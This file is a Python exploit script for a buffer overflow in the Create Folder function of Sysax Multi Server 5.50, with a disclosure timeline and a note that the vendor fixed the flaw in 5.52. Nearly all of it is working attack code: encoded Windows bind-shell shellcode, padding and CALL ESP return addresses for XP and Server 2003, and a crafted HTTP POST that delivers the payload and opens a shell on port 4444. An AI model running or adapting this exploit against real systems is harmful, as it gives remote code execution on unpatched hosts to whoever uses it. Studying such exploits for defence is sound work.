#!/usr/bin/python
# -*- coding: utf-8 -*-
##########################################################################################################
#Title: Sysax Multi Server 5.50 Create Folder BOF
#Author: Craig Freyman (@cd1zz)
#Tested on: XP SP3 32bit and Server 2003 SP2 32bit(No DEP)
#Date Discovered: January 13, 2012
#Vendor Contacted: January 15, 2012
#Vendor Response: January 16, 2012
#Vendor Fix: Version 5.52 released on January 17, 2012 fixes issue
#Additional exploit details, notes and assumptions can be found here:
#http://www.pwnag3.com/2012/01/sysax-multi-server-550-exploit.html
##########################################################################################################

import socket,sys

if len(sys.argv) != 5:
	print "[+] Usage: ./attack.py <Target IP> <Port> <SID> <XP or 2K3>"
	sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
sid = sys.argv[3]
os = sys.argv[4]

if len(sid) != 40:
	print "[X] Something is wrong with your SID, it should be 40 bytes long."
	print "[X] Refer to http://www.pwnag3.com/2012/01/sysax-multi-server-550-exploit.html"
	sys.exit(1)

#msfvenom -p windows/shell_bind_tcp LPORT=4444 -e x86/shikata_ga_nai -b "\x00"
#[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)

shell = ("\xda\xdc\xd9\x74\x24\xf4\x5f\x2b\xc9\xb8\xb7\x6e\xc5\xe9"
"\xb1\x56\x83\xc7\x04\x31\x47\x14\x03\x47\xa3\x8c\x30\x15"
"\x23\xd9\xbb\xe6\xb3\xba\x32\x03\x82\xe8\x21\x47\xb6\x3c"
"\x21\x05\x3a\xb6\x67\xbe\xc9\xba\xaf\xb1\x7a\x70\x96\xfc"
"\x7b\xb4\x16\x52\xbf\xd6\xea\xa9\x93\x38\xd2\x61\xe6\x39"
"\x13\x9f\x08\x6b\xcc\xeb\xba\x9c\x79\xa9\x06\x9c\xad\xa5"
"\x36\xe6\xc8\x7a\xc2\x5c\xd2\xaa\x7a\xea\x9c\x52\xf1\xb4"
"\x3c\x62\xd6\xa6\x01\x2d\x53\x1c\xf1\xac\xb5\x6c\xfa\x9e"
"\xf9\x23\xc5\x2e\xf4\x3a\x01\x88\xe6\x48\x79\xea\x9b\x4a"
"\xba\x90\x47\xde\x5f\x32\x0c\x78\x84\xc2\xc1\x1f\x4f\xc8"
"\xae\x54\x17\xcd\x31\xb8\x23\xe9\xba\x3f\xe4\x7b\xf8\x1b"
"\x20\x27\x5b\x05\x71\x8d\x0a\x3a\x61\x69\xf3\x9e\xe9\x98"
"\xe0\x99\xb3\xf4\xc5\x97\x4b\x05\x41\xaf\x38\x37\xce\x1b"
"\xd7\x7b\x87\x85\x20\x7b\xb2\x72\xbe\x82\x3c\x83\x96\x40"
"\x68\xd3\x80\x61\x10\xb8\x50\x8d\xc5\x6f\x01\x21\xb5\xcf"
"\xf1\x81\x65\xb8\x1b\x0e\x5a\xd8\x23\xc4\xed\xde\xed\x3c"
"\xbe\x88\x0f\xc3\x51\x15\x99\x25\x3b\xb5\xcf\xfe\xd3\x77"
"\x34\x37\x44\x87\x1e\x6b\xdd\x1f\x16\x65\xd9\x20\xa7\xa3"
"\x4a\x8c\x0f\x24\x18\xde\x8b\x55\x1f\xcb\xbb\x1c\x18\x9c"
"\x36\x71\xeb\x3c\x46\x58\x9b\xdd\xd5\x07\x5b\xab\xc5\x9f"
"\x0c\xfc\x38\xd6\xd8\x10\x62\x40\xfe\xe8\xf2\xab\xba\x36"
"\xc7\x32\x43\xba\x73\x11\x53\x02\x7b\x1d\x07\xda\x2a\xcb"
"\xf1\x9c\x84\xbd\xab\x76\x7a\x14\x3b\x0e\xb0\xa7\x3d\x0f"
"\x9d\x51\xa1\xbe\x48\x24\xde\x0f\x1d\xa0\xa7\x6d\xbd\x4f"
"\x72\x36\xcd\x05\xde\x1f\x46\xc0\x8b\x1d\x0b\xf3\x66\x61"
"\x32\x70\x82\x1a\xc1\x68\xe7\x1f\x8d\x2e\x14\x52\x9e\xda"
"\x1a\xc1\x9f\xce")

#No DEP bypass :(
if os == "2K3":
	junk = "\x41" * 648
	jump = "\xDF\xF2\xE5\x77" #77E5F2DF CALL ESP kernel32.dll
	buf = junk + jump + "\x90" * 10 + shell + "\x44" * 1000

if os == "XP":
	junk = "\x41" * 667
	jump = "\xF0\x69\x83\x7C" #7C8369F0 CALL ESP kernel32.dll
	buf = junk + jump + "\x90" * 50 + shell + "\x44" * 1000

print "================================================"
print "[*] Sysax Multi Server 5.50 Create Folder BOF"
print "[*] ------------------by cd1zz------------------"
print "[*] Launching exploit against " + target + "...."
print "================================================"

head = "POST /scgi?sid="+sid+"&pid=mk_folder2_name1.htm HTTP/1.1\r\n"
head += "Host: \r\n"
head += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:9.0.1) Gecko/20100101 Firefox/9.0.1\r\n"
head += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
head += "Accept-Language: en-us,en;q=0.5\r\n"
head += "Accept-Encoding: gzip, deflate\r\n"
head += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
head += "Proxy-Connection: keep-alive\r\n"
head += "Referer: http://"+target+"/scgi?sid="+sid+"&pid=mk_folder1_name1.htm\r\n"
head += "Content-Type: multipart/form-data; boundary=---------------------------1190753071675116720811342231\r\n"
head += "Content-Length: 171\r\n\r\n"
head += "-----------------------------1190753071675116720811342231\r\n"
head += "Content-Disposition: form-data; name=\"e2\"\r\n\r\n"
head += buf+"\r\n"
head += "-----------------------------1190753071675116720811342231--\r\n\r\n"

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((target, port))
	s.send(head + "\r\n")
	print "[*] Payload sent!"
	print "[*] Go check your shell..."
	s.recv(1024)
	s.close()
except:
	print "[X] Meh! Fail!"

